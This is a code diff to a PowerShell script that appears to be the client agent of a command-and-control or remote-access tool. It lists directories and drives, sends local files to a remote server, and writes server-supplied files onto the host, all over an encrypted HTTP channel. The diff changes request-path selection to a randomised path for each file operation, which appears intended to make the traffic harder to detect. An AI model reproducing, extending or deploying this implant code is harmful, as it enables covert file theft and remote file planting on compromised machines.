@@ -76,8 +76,7 @@ function Get-DirectoryListing {
     }
 }
 
-# Function to download a file from the server to the client
-# From client perspective: "Upload-File" means receiving a file FROM server TO client
+# Function to configure a web client with proper settings
 function New-ConfiguredWebClient {
     $webClient = New-Object System.Net.WebClient
     
@@ -168,14 +167,9 @@ function Upload-File {
         $requestJson = ConvertTo-Json -InputObject $fileRequest -Compress
         Write-Host "Request JSON: $requestJson"
         
-        # Get current file request path
-        $fileRequestPath = if ($global:pathRotationEnabled) { 
-            Get-CurrentPath -PathType "file_request_path" 
-        } else { 
-            "/file_request"  # Default fallback if not defined
-        }
-        
-        Write-Host "Using file request path: $fileRequestPath"
+        # Get a random path for file operation
+        $filePath = Get-RandomPath -ForFileOperation
+        Write-Host "Using random file operation path: $filePath"
         
         # Encrypt the request
         $encryptedRequest = Encrypt-Data -PlainText $requestJson
@@ -215,10 +209,10 @@ function Upload-File {
         $webClient.Headers.Add("Content-Type", "application/json")
         
         # Send the request
-        $requestUrl = "http://$serverAddress$fileRequestPath"
+        $requestUrl = "http://$serverAddress$filePath"
         Write-Host "Sending file request to $requestUrl"
         
-        # ===== NEW ERROR HANDLING AND DEBUG CODE =====
+        # ===== ERROR HANDLING AND DEBUG CODE =====
         try {
             # Send the request
             $response = $webClient.UploadString($requestUrl, $payloadJson)
@@ -227,144 +221,104 @@ function Upload-File {
             Write-Host "DEBUG: Response length: $($response.Length) chars"
             Write-Host "DEBUG: Response preview: $($response.Substring(0, [Math]::Min(50, $response.Length)))"
             
-            # ===== FALLBACK HANDLING CODE =====
-            # First try to parse as JSON with standard handling
+            # Parse and decrypt the response
             try {
                 $responseObj = $null
                 
                 # Check if response is valid JSON by trying to parse it
                 $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
                 
-                # If we get here, JSON parsing succeeded
-                Write-Host "DEBUG: Response JSON has these properties: $($responseObj.PSObject.Properties.Name -join ', ')"
-                
-                # If 'd' field is missing, try to handle it
-                if (-not ($responseObj.PSObject.Properties.Name -contains 'd')) {
-                    Write-Host "WARNING: Response missing 'd' field, trying fallback"
-                    
-                    # FALLBACK 1: Check if the entire response itself is the encrypted data 
-                    try {
-                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $response
-                        Write-Host "SUCCESS: Decrypted response directly"
-                    }
-                    catch {
-                        # FALLBACK 2: Try wrapping response in a structure with a 'd' field
-                        try {
-                            $modifiedResponse = @{ d = $response }
-                            $modifiedJson = ConvertTo-Json -InputObject $modifiedResponse -Compress
-                            $responseObj = ConvertFrom-Json -InputObject $modifiedJson
-                            $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObj.d
-                            Write-Host "SUCCESS: Used wrapped response"
-                        }
-                        catch {
-                            # If all attempts failed, throw the original error
-                            throw "Response missing data field 'd' and fallbacks failed"
-                        }
-                    }
-                }
-                else {
-                    # Regular processing with d field present
+                # Process based on presence of 'd' field
+                if ($responseObj.PSObject.Properties.Name -contains 'd') {
                     $encryptedData = $responseObj.d
                     $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedData
                 }
-            }
-            catch [System.ArgumentException] {
-                # This happens if ConvertFrom-Json fails - the response isn't valid JSON
-                Write-Host "ERROR: Response is not valid JSON"
-                
-                # FALLBACK 3: Try to treat entire response as encrypted data
-                try {
+                else {
+                    # Try direct decryption as fallback
                     $decryptedResponse = Decrypt-Data -EncryptedBase64 $response
-                    Write-Host "SUCCESS: Decrypted response directly (not JSON)"
                 }
-                catch {
-                    throw "Response is not valid JSON and could not be decrypted: $_"
-                }
-            }
-            
-            # Try to parse the decrypted response as JSON
-            try {
+                
+                # Try to parse the decrypted response as JSON
                 $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
-            }
-            catch {
-                Write-Host "Error parsing decrypted response as JSON: $_"
-                Write-Host "Raw decrypted response: $decryptedResponse"
-                throw "Invalid JSON in decrypted response"
-            }
-            
-            # Check if file was found
-            if ($fileResponse.Status -eq "Error") {
-                return "Error: $($fileResponse.Message)"
-            }
-            
-            # Get file content and save it
-            $fileContent = [System.Convert]::FromBase64String($fileResponse.FileContent)
-            
-            # Write bytes to file with error handling
-            try {
-                # Write file with proper path verification
-                Write-Host "Writing to file: $DestinationPath"
                 
-                # Before writing, make sure parent directory exists
-                $parentDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
-                if (-not [string]::IsNullOrEmpty($parentDir) -and -not (Test-Path -Path $parentDir -PathType Container)) {
-                    Write-Host "Creating parent directory: $parentDir"
-                    New-Item -Path $parentDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+                # Check if file was found
+                if ($fileResponse.Status -eq "Error") {
+                    return "Error: $($fileResponse.Message)"
                 }
                 
-                # Now write the file
-                [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
-                Write-Host "File successfully written to $DestinationPath"
-            }
-            catch [System.UnauthorizedAccessException] {
-                # Permission issue - fall back to temp
-                Write-Host "Permission denied, falling back to temp folder"
-                $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
-                Write-Host "New path: $newPath"
-                [System.IO.File]::WriteAllBytes($newPath, $fileContent)
-                $DestinationPath = $newPath
-                Write-Host "File successfully written to $DestinationPath"
-            }
-            catch [System.IO.DirectoryNotFoundException] {
-                # Directory not found - create it or fall back to temp
-                Write-Host "Directory not found, attempting to create it"
+                # Get file content and save it
+                $fileContent = [System.Convert]::FromBase64String($fileResponse.FileContent)
+                
+                # Write bytes to file with error handling
                 try {
-                    $dirPath = [System.IO.Path]::GetDirectoryName($DestinationPath)
-                    New-Item -Path $dirPath -ItemType Directory -Force -ErrorAction Stop | Out-Null
+                    # Write file with proper path verification
+                    Write-Host "Writing to file: $DestinationPath"
+                    
+                    # Create parent directory if needed
+                    $parentDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
+                    if (-not [string]::IsNullOrEmpty($parentDir) -and -not (Test-Path -Path $parentDir -PathType Container)) {
+                        Write-Host "Creating parent directory: $parentDir"
+                        New-Item -Path $parentDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+                    }
+                    
+                    # Write the file
                     [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
-                    Write-Host "File successfully written after creating directory: $DestinationPath"
+                    Write-Host "File successfully written to $DestinationPath"
                 }
-                catch {
-                    # Fall back to temp directory
-                    Write-Host "Failed to create directory, falling back to temp folder"
+                catch [System.UnauthorizedAccessException] {
+                    # Permission issue - fall back to temp
+                    Write-Host "Permission denied, falling back to temp folder"
                     $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
+                    Write-Host "New path: $newPath"
                     [System.IO.File]::WriteAllBytes($newPath, $fileContent)
                     $DestinationPath = $newPath
                     Write-Host "File successfully written to $DestinationPath"
                 }
+                catch [System.IO.DirectoryNotFoundException] {
+                    # Directory not found - create it or fall back to temp
+                    Write-Host "Directory not found, attempting to create it"
+                    try {
+                        $dirPath = [System.IO.Path]::GetDirectoryName($DestinationPath)
+                        New-Item -Path $dirPath -ItemType Directory -Force -ErrorAction Stop | Out-Null
+                        [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
+                        Write-Host "File successfully written after creating directory: $DestinationPath"
+                    }
+                    catch {
+                        # Fall back to temp directory
+                        Write-Host "Failed to create directory, falling back to temp folder"
+                        $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
+                        [System.IO.File]::WriteAllBytes($newPath, $fileContent)
+                        $DestinationPath = $newPath
+                        Write-Host "File successfully written to $DestinationPath"
+                    }
+                }
+                catch {
+                    # General error - try alternative method with stream
+                    Write-Host "Error writing file, trying alternate method: $_" 
+                    try {
+                        # Try to use FileStream instead
+                        $fileStream = New-Object System.IO.FileStream($DestinationPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
+                        $fileStream.Write($fileContent, 0, $fileContent.Length)
+                        $fileStream.Close()
+                        $fileStream.Dispose()
+                        Write-Host "File successfully written using FileStream: $DestinationPath"
+                    }
+                    catch {
+                        # Fall back to temp directory as last resort
+                        Write-Host "All write attempts failed, falling back to temp folder: $_"
+                        $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath) -replace '[^\w\.-]', '_')
+                        [System.IO.File]::WriteAllBytes($newPath, $fileContent)
+                        $DestinationPath = $newPath
+                        Write-Host "File successfully written to $DestinationPath"
+                    }
+                }
+                
+                return "Successfully downloaded $($fileResponse.FileName) ($($fileResponse.FileSize) bytes) to $DestinationPath"
             }
             catch {
-                # General error - try alternative method with stream
-                Write-Host "Error writing file, trying alternate method: $_" 
-                try {
-                    # Try to use FileStream instead
-                    $fileStream = New-Object System.IO.FileStream($DestinationPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
-                    $fileStream.Write($fileContent, 0, $fileContent.Length)
-                    $fileStream.Close()
-                    $fileStream.Dispose()
-                    Write-Host "File successfully written using FileStream: $DestinationPath"
-                }
-                catch {
-                    # Fall back to temp directory as last resort
-                    Write-Host "All write attempts failed, falling back to temp folder: $_"
-                    $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath) -replace '[^\w\.-]', '_')
-                    [System.IO.File]::WriteAllBytes($newPath, $fileContent)
-                    $DestinationPath = $newPath
-                    Write-Host "File successfully written to $DestinationPath"
-                }
+                Write-Host "Error processing server response: $_"
+                return "Error processing server response: $_"
             }
-            
-            return "Successfully downloaded $($fileResponse.FileName) ($($fileResponse.FileSize) bytes) to $DestinationPath"
         }
         catch {
             Write-Host "Error processing server response: $_"
@@ -378,7 +332,6 @@ function Upload-File {
 }
 
 # Function to upload a file from the client to the server
-# From client perspective: "Download-File" means sending a file FROM client TO server
 function Download-File {
     <#
     .SYNOPSIS
@@ -449,7 +402,7 @@ function Download-File {
             Description = "File uploaded from client"
         }
         
-        # Create the operation payload with CORRECT operation type for client->server upload
+        # Create the operation payload
         $operationPayload = @{
             "op_type" = "file_up"    # Must be file_up for client->server transfer
             "payload" = $fileData
@@ -477,23 +430,11 @@ function Download-File {
         
         $payloadJson = ConvertTo-Json -InputObject $payload -Compress
         
-        # Select a path (either random from pool or specific file upload path)
-        $uploadPath = $null
+        # Get a random path for file operation
+        $uploadPath = Get-RandomPath -ForFileOperation
+        Write-Host "Using random file operation path: $uploadPath"
         
-        # If path rotation is enabled and we have a path pool, use a random path 70% of the time
-        if ($global:pathRotationEnabled -and $global:pathPool -and $global:pathPool.Count -gt 0) {
-            if ((Get-Random -Minimum 1 -Maximum 100) -le 70) {
-                $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
-                $uploadPath = $global:pathPool[$randomIndex]
-            }
-        }
-        
-        # If we didn't select a random path, use the dedicated file upload path
-        if (-not $uploadPath) {
-            $uploadPath = Get-CurrentPath -PathType "file_upload_path"
-        }
-        
-        # Ensure server address is valid and properly formatted
+        # Construct the upload URL with validated server address
         if ([string]::IsNullOrEmpty($global:serverAddress) -or $global:serverAddress -eq "/" -or $global:serverAddress -eq "//") {
             Write-Host "Warning: Server address is empty or invalid. Setting to localhost."
             $global:serverAddress = "localhost"
@@ -505,7 +446,7 @@ function Download-File {
             Write-Host "Removed trailing slash from server address: $global:serverAddress"
         }
         
-        # Construct the upload URL with validated server address
+        # Construct the upload URL
         $uploadUrl = "http://$($global:serverAddress)$uploadPath"
         Write-Host "Sending file upload to $uploadUrl"
         
@@ -553,6 +494,8 @@ function Download-File {
         return "Error uploading file: $_"
     }
 }
+
+# Other utility functions remain unchanged
 
 function Get-DriveInfo {
     <#
